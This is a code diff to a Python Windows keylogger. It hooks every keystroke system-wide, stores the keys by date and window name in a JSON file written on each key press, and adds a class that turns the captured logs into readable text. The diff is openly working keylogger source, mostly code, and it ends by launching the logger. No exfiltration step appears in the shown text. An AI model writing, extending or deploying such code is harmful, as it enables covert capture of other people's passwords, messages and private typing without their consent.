@@ -10,8 +10,7 @@ class KeyLoggerDaemon:
     A basic implementation of a python key logger
     stores logged keys per-window per-date in a json format
 
-    full log is stored in mem on a return key or tab key
-    the buffer is written to disk.
+    buffer is writen to disk on each key stroke (better solution required)
 
     buffer structure - {date: {windows name: [list of keystrokes]}}
 
@@ -38,16 +37,19 @@ class KeyLoggerDaemon:
         keyboard press callback, process each key press as necessary.
         if tab or return are in the event the buffer is written out
         """
-        print(event.WindowName, event.Key)  # debug
-        print(self.buffer)
+        print(event.WindowName, event.Key, chr(int(event.Ascii)))  # debug
 
         if str(date.today()) not in self.buffer:  # check if current date in dict
             self.buffer[str(date.today())] = dict()
-
         if event.WindowName not in self.buffer[str(date.today())]:  # check if window already in dict
             self.buffer[str(date.today())][event.WindowName] = list()
 
-        self.buffer[str(date.today())][event.WindowName].append(event.Key)  # add event to buffer
+        key = chr(int(event.Ascii))
+
+        if key == '\x00':
+            key = event.Key
+
+        self.buffer[str(date.today())][event.WindowName].append(key)  # add event to buffer
 
         # if event.Ascii == 13 or event.Ascii == 9:  # when enter or tab is pressed the buffer is dumped
         self.__dump_buffer()  # dump buffer, inefficient but works more reliably
@@ -82,6 +84,60 @@ class KeyLoggerDaemon:
         """
         self.__hook.HookKeyboard()
         pythoncom.PumpMessages()
+
+
+class KeyLog:
+    """
+    processes and prettifies key logger logs
+    """
+
+    def __init__(self, log: dict):
+        self.log = log
+
+    @property
+    def windows(self) -> tuple:
+        windows = list()
+        for key in self.log:
+            windows += self.log[key].keys()
+        return tuple(windows)
+
+    @property
+    def dates(self) -> tuple:
+        return tuple(self.log.keys())
+
+    @property
+    def raw_log(self):
+        return self.log
+
+    def prettify(self) -> str:
+        mapping = {"shift" + k: v for k, v in zip("1234567890-=[];'#,./", "!\"£$%^&*()_+{}:@~<>?")}
+        space = " "
+        tab = "     "
+        nl = "\n"
+        final_out = str()
+        for log_date in self.dates:
+            final_out += log_date + nl
+            for window in self.log[log_date]:
+                final_out += tab + window + nl + tab + tab
+                for key in self.log[log_date][window]:
+                    if key == "Return":
+                        final_out += nl + tab + tab + key + nl + tab + tab
+                    elif key == "Back":
+                        final_out += space + key + space
+                    elif key == "Space":
+                        final_out += space
+                    elif key in ("Lcontrol", "Rcontrol"):
+                        final_out += space + "ctrl" + space
+                    elif key in ("Volume_Up", "Volume_Down", "Down", "Up", "Left", "Right"):
+                        continue
+                    else:
+                        final_out += key
+                final_out += nl
+
+        for key in mapping:  # corrects shifted characters
+            final_out = final_out.replace(key, mapping[key])
+
+        return final_out
 
 
 KeyLoggerDaemon().watch()
